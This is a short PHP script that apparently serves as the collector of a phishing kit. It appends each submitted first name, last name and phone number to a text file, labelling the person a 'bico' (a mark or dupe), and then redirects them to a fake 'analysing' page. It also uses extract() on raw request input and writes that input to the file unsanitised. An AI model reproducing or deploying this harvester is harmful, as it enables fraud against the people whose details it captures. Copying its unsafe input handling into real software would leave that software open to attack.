<?php
    extract($_REQUEST);
    $file=fopen("dados.txt","a");

    fwrite($file,"\nNome Do Bico:");
    fwrite($file, $firstname ."\n");
    fwrite($file,"SobreNome:");
    fwrite($file, $lastname ."\n");
    fwrite($file,"Numero dele:");
    fwrite($file, $phone ."\n");
    fwrite($file,"");
    fwrite($file,"========");
    fclose($file);
    header("location: /analisando/");
 ?>
